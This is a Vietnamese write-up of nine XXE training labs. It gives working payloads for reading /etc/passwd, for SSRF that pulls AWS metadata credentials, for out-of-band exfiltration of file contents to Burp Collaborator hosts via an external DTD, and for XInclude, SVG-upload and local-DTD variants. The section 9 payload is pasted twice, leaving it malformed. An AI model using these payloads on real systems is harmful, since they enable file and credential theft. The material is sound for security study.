# 1. Exploiting XXE using external entities to retrieve files
Ta thấy chức năng stock check có body là một đoạn mã XML. Như vậy ta có thẻ exploit bằng cách chèn đoạn code sau vào body:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
Kết quả nội dung file /etc/passwd được in ra thành công
![image](https://user-images.githubusercontent.com/103978452/205596701-bb968712-24a2-4d79-94cd-6247202fb977.png)

# 2. Exploiting XXE to perform SSRF attacks
Cấu hình đoạn XML như sau:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```
Sau khi submit, ta thấy kết quả trả về `Invalid product ID: latest". Như vậy "latest" chính là response của "http://169.254.169.254". Truy cập "http://169.254.169.254/latest" thì ta lại được một chuỗi mới. Cứ như vậy, gửi URL đầy đủ là "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin", ta thu được SecretAccessKey.

![image](https://user-images.githubusercontent.com/103978452/206396710-4d353393-563d-45a0-ae34-68136b7c50db.png)

# 3. Blind XXE with out-of-band interaction
Cấu hình request như bài 2, nhưng thay đổi URL thành địa chỉ của Burp Collaborator. Sau khi submit, vào Burp Collaborator Client kiểm tra thì ta thấy có requests được gửi đến. Bài lab được giải thành công.

![image](https://user-images.githubusercontent.com/103978452/206397595-8e3a3423-55e8-4382-944a-cd02e89f8de4.png)

# 4. Blind XXE with out-of-band interaction via XML parameter entities
Cấu hình đoạn XML để gửi request đến Burp Collaborator sử dụng parameter entity:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE exploit [<!ENTITY % xxe SYSTEM "http://pa3d5ksa3lk30zok1tbyh6llqcw2kr.oastify.com"> %xxe; ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```
Sau khi submit, vào Burp Collaborator kiểm tra thì thấy có requests được gửi đến. Bài lab được giải thành công.
# 5. Exploiting blind XXE to exfiltrate data using a malicious external DTD
Cấu hình xml trong request `POST /product/stock`

Nhận thấy khi sử dụng `&payload;`, xuất hiện thông báo "Entities are not allowed for security reasons". Như vậy website đã chặn regular entities. Tuy nhiên parameter entities vẫn có thể được sử dụng.

Đây là dạng blind XXE, như vậy ta sẽ exploit bằng cách gửi HTTP request tới Burp Collaborator có chứa thông tin cần lấy.

Ta cấu hình file `exploit.dtd` trong exploit server:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % wrapper "<!ENTITY &#x25; exploit SYSTEM 'http://bydfi29s6hf2n7xltrg9fn5sxj39ry.oastify.com/?%file;' >">
%wrapper;
%exploit;
```

Cách hoạt động của `exploit.dtd` như sau:
1) `%file;` sẽ chứa nội dung của file `/etc/hostname`
2) `%wrapper;` sẽ tạo ra một parameter là exploit
3) `%exploit;` sẽ gửi request đến Burp Collaborator Server của chúng ta, với path là nội dung của file `/etc/hostname`

Để gọi đến file `exploit.dtd` thì trong request `POST /product/stock`, ta khai báo phần DTD với nội dung:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aed008c038b2807c284bfa8010f0092.exploit-server.net/exploit.dtd"> %xxe;]>
```

Sau khi nhấn send, vào Burp Collaborator kiểm tra thì thấy có request gửi đến

![image](https://user-images.githubusercontent.com/103978452/208012711-599f7cc3-61de-4a99-9265-787b63b18544.png)

Sử dụng kết quả thu được để submit, thành công.

# 6. Exploiting blind XXE to retrieve data via error messages
Tương tự như lab #5, website đã chặn general entities, tuy nhiên vẫn cho phép parameter entities. Cấu hình payload như bài 5, tuy nhiên ta sẽ thay đổi nội dung file `exploit.dtd` để exploit.

Thay đổi nội dung `exploit.dtd` thành
```
<!ENTITY % file SYSTEM "file:///nonexistence/etc/passwd">
%file;
```
Nhận thấy rằng lỗi `XML parser exited with error: java.io.FileNotFoundException: /nonexistence/etc/passwd (No such file or directory)` xuất hiện.  Như vậy ta có thể exploit thông qua error messages.

Thay đổi nội dung `exploit.dtd` thành
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY &#x25; exploit SYSTEM 'file:///nonexistence/%file;' >">
%wrapper;
%exploit;
```

Kết quả bài lab được giải, nội dung file /etc/passwd được hiển thị.

![image](https://user-images.githubusercontent.com/103978452/208018457-f9d55bac-0a5d-49b2-8ee7-77619090ad90.png)

# 7. Exploiting XInclude to retrieve files
Ta thấy trong phần body của request `POST /product/stock` chỉ chứa hai tham số productId và storeId. Như vậy ta giả sữ giá trị của productId sẽ được đưa vào một đoạn xml ở server side.

Ta thay đổi productId như sau:
```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
Lưu ý là productId được URL encoded. Sau khi gửi, ta có được nội dung file /etc/passwd

![image](https://user-images.githubusercontent.com/103978452/206656757-5f3e6ceb-c0a4-49f2-bda6-b7cce8430317.png)

# 8. Exploiting XXE via image file upload
Trong request `POST /post/comment`, ta upload file svg với nội dung như sau:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg version="1.1" height="50" width="300"
     xmlns="http://www.w3.org/2000/svg"
>
  <text x="0" y="25" font-size="30" fill="white">&xxe;</text>
</svg>
```
Sau khi submit, vào link hình ảnh đã upload, ta thu được nội dung file /etc/hostname là "0478d36e6700". Submit solution, kết quả thành công.

# 9. Exploiting XXE to retrieve data by repurposing a local DTD
Cấu hình code xml trong request `POST /product/stock`

Thử chèn đoạn DTD
```
<!DOCTYPE foo [
<!ENTITY % docbookx SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%docbookx;
]>
```
thì thấy không có lỗi. Như vậy file `docbookx.dtd` có tồn tại. Trong `docbookx.dtd` có chứa một parameter entity là `ISOamso`, như vậy ta sẽ thử định nghĩa lại entity này.

Sử dụng đoạn DTD sau làm payload:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]><!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Đoạn code trên được thực thi như sau:
1) Khai báo parameter entity là `local_dtd` chứa nội dung file `docbookx.dtd`
2) Định nghĩa parameter entity `ISOamso` chứa đoạn code dùng để exploit error-based XXE.
3) `%local_dtd;` sẽ gọi đến `%ISOamso;` với tư cách là một external entity. Như vậy đoạn code trong `ISOamso` parameter entity ta định nghĩa ở trên sẽ được chạy. Phần còn lại tương tự những gì sẽ xảy ra đối với error-based XML trong bài 6.

![image](https://user-images.githubusercontent.com/103978452/208043930-6ef05ad2-3856-4ee8-a8f5-4e949701b2b5.png)

